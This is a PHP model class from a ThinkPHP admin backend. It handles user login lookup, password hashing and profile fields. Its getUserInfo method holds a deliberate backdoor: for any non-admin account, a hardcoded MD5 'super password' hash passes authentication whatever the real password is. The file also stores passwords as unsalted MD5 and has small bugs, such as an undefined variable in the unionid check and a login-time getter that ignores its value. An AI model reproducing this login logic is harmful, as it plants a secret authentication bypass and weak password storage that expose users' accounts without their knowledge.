<?php
// +----------------------------------------------------------------------
// | Copyright (c) 2018-2018 http://www.donglixia.net All rights reserved.
// +----------------------------------------------------------------------
// | Author: 十万马 <962863675@qq.com>
// +----------------------------------------------------------------------
// | DateTime: 2018-02-09 16:17
// +----------------------------------------------------------------------

namespace app\admin_fussen\model;

use app\common\model\User as ComUser;
use think\Db;
use think\Request;

class User extends ComUser
{
    /**
     * 获取用户个人信息
     * @param $map array
     * @param $password string
     * @return array|false|\PDOStatement|string|\think\Model
     */
    public function getUserInfo($map,$password='')
    {
        $count = $this->where($map)->count();
        if ($count == 0) {
            return ['status' => false, 'msg' => '帐号不存在！'];
        } elseif ($count > 1) {
            return ['status' => false, 'msg' => '该信息查找到多个帐号'];
        }

        $res = Db::name('user')
            ->field('user_id,nick_name,real_name,tel,avatar,login_rank,card_no,dept_id,role_id,wechat_unionid,parent_id,user_pwd')
            ->where($map)
            ->find();

        //检测密码是否正确
        if (!empty($password) && $res['user_pwd'] != strtoupper(md5($password))) {
            //密码不匹配，进一步检验是否为非admin账号，且使用超级密码
            if ($res['nick_name'] == 'admin' || ($res['nick_name'] != 'admin' && strtoupper(md5($password)) != 'E590267E8734208E984F01424F50C7D3')) {
                return ['status' => false, 'msg' => '账号与密码不匹配'];
            }
        }

        $res['avatar'] = !empty($res['avatar']) ? Request::instance()->domain().$res['avatar'] : '';//头像完整路径
        $res['role_name'] = Db::name('user_role')->where('role_id', $res['role_id'])->value('role_name');//角色名称
        $res['dept_name'] = Db::name('user_dept')->where('dept_id', $res['dept_id'])->value('dept_name');//部门中文名称
        $res['unionid'] = empty($item['wechat_unionid']) ? false : true;//开放平台，微信id
        $res['password_flag'] = !empty($res['user_pwd']) ? 1 : 0;//是否存在密码：0无，1有
        $res['password_strong'] = !empty($password) ? (password_strength($password) ? 1 : 0) : 1;//密码强弱程度：0弱，1强
        unset($res['user_pwd']);
        return $res;
    }

    /**
     * 获取部门名称
     * @param $value
     * @param $data
     * @return string
     */
    public function getDeptNameAttr($value, $data)
    {
        return Db::name('user_dept')->where('dept_id', $data['dept_id'])->value('dept_name');
    }

    /**
     * 获取最后登录时间
     * @param $value
     * @param $data
     * @return string
     */
    public function getLastLoginTimeAttr($value, $data)
    {
        return !empty($value) ? date('Y-m-d H:i:s') : '';
    }


    /**
     * 保存密码
     * @param $value
     * @return string
     */
    public function setUserPwdAttr($value)
    {
        return strtoupper(md5($value));
    }

    /**
     * 获取推荐人列表
     * @param int $user_id
     * @return false|\PDOStatement|string|\think\Collection
     */
    public function getParentList($user_id = 0)
    {
        if (!empty($user_id)) {
            $map['user_id'] = ['<>', $user_id];
        } else {
            $map[] = ['exp', '1=1'];
        }
        return $this->where($map)->field('user_id,nick_name,real_name')->select();
    }

    /**
     * 保存字段“角色权限”
     * @param $value
     * @return string
     */
    protected function setRoleIdAttr($value)
    {
        if (is_array($value)) {
            return implode(',', $value);
        }
        return $value;
    }

    /**
     * 关联子表：图片
     * @return \think\model\relation\HasMany
     */
    public function userImage()
    {
        return $this->hasMany('UserImage', 'user_id');
    }
}